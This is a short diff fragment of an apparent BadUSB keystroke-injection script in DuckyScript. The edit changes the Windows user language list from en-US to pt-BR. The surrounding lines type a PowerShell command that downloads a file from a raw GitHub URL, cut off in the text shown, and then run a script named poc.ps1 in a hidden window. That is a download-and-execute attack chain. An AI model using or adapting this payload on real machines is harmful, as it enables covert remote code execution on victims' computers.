@@ -56,7 +56,7 @@ STRING (new-object net.webclient).DownloadFile('https://raw.githubusercontent.co
 DELAY 500
 ENTER
 DELAY 500
-STRING Set-WinUserLanguageList -LanguageList en-US -Force
+STRING Set-WinUserLanguageList -LanguageList pt-BR -Force
 ENTER
 DELAY 500
 STRING powershell.exe -windowstyle hidden -file poc.ps1
